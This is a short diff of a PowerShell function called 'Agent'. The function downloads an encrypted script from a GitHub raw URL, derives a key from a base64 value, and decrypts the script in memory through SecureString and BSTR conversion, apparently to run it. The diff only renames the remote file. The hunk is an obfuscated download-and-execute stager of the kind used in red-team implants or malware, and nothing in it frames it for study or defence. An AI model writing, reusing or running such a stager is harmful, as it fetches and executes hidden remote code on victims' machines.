@@ -9,7 +9,7 @@ function Agent {
 
 	$EncryptKey = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($key))
 	$EncryptKey = [System.Text.Encoding]::Unicode.GetBytes($EncryptKey)
-	$InvokeScript = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fivkneox/rt/master/invoke-s')
+	$InvokeScript = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fivkneox/rt/master/invoker-s')
 	$InvokeAgent = $InvokeScript | ConvertTo-SecureString -Key $EncryptKey 
 
 	$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($InvokeAgent)
